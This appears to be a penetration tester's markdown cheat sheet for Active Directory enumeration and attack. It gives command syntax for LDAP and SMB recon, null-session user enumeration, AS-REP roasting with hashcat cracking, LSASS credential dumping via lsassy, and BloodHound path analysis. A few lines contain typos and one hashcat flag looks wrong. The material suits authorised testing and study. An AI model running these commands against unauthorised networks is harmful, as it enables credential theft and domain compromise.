# Active Directory Enumeration Syntax

## Tools

``
nmap
ldapsearch 
smbclient
GetNPUsers.py
lsassy
Bloodhound
bloodhound-python
rpcclient
``
## Recon

### nmap 

Scan for ldap enum

``
nmap -sV -sC -Pn --open IP -p- --script ldap-rootdse
``

### rpcclient

``
rpcclient IP -U%
``
fpr nukk Auth

to get Users

``
enumdomusers
``

### Ldapsearch

``
ldapsearch -h IP -p port/389 -x -b "dc=domain,dc=domain"
``

### SmbClient

To see and interact with all the smb shares 

``
smbclient -L \\\\IP\\
``

``
smbclient -L \\\\IP\\share\ -U ""%""
``

### GetNPUsers.py

For ASREPRoast

``
GetNPUsers.py domain/user -dc-ip IP -no-pass
``

``
GetNPUsers.py domain/ -usersfile file  -dc-ip IP -no-pass
``
To crack the hash using 

``
hashcat -m 18200 hashfile -a 3
``

``
hashcat -m 18200 hashfile wordlist  -a 3
``
### Lsassy
lsd

``
lsassy -m 0 -d domain.com -u username -p password ip
``
## Post-Exploitation

### BloodHound

Use bloodhound-python to get the JSON file with all data using below syntax 

``
Bloodhound-python -d domain.xxxxx -u User -p password -gc hostname.xx.xxxx -c all -ns ip
``
open the JSON file using BloodHound GUI and get the shortest path towards your target 

